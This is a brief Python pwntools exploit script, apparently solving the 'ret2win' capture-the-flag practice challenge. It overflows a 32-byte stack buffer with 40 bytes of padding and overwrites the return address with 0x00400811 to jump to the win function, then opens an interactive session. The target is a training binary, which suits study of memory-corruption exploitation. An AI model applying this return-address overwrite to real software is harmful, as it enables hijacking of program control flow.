from pwn import *

ret2win64 = process('ret2win')
ret2win64.recv()

payload = b"A" * 40        # pwnme allocates 32B of input buffer + 8B RBP
payload += p64(0x00400811) # RIP ret2win

ret2win64.sendline(payload)
ret2win64.interactive()
